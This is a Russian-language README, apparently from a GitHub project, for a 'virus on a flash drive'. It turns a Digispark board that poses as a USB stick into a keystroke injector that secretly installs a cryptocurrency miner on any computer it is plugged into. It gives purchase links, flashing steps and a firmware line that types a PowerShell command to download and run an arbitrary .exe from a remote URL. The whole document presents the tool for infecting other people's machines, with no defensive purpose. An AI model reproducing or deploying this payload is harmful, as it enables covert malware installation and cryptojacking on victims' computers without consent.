# miner-digispark | Вирус на флешке
_Прошивка для digispark + скрытый майнер_
## Идея
При подключении "флешки" к компютерю будет устанавливаться и запускаться скрытый майнер
## Реализация
- Покупаем  [Digispark](https://alexgyver.ru/lessons/digispark/) 

> [Купить на Ozon](https://ozon.ru/t/Dr8D1GD) | [Купить на AliExpress](https://aliexpress.ru/item/2040316211.html?sku_id=58307777832&spm=a2g2x.productlist.search_results.1.5d115ed1ofwRd7) 

- Устанавливаем [прошивку](firmware.ino) и открываем в [Arduino IDE](https://www.arduino.cc/en/software)
- Редактируем под себя
> TrinketKeyboard.print("powershell -c \"Invoke-WebRequest -Uri 'ПРЯМАЯ ССЫЛКА НА ФАЙЛ https://...exe' -OutFile 'ПУТЬ КУДА БУДЕТ ЗАГРУЖАТЬСЯ ФАЙЛ/НАЗВАНИЕ ФАЙЛА.exe'; Start-Process 'ПУТЬ КУДА БУДЕТ ЗАГРУЖАТЬСЯ ФАЙЛ/НАЗВАНИЕ ФАЙЛА.exe'\"");
> Создаем билдер для майнера и загружаем на github
- Загружаем прошивку [(Инструкция)](https://github.com/Sudox00/miner-digispark/blob/main/manual-firmware.md)
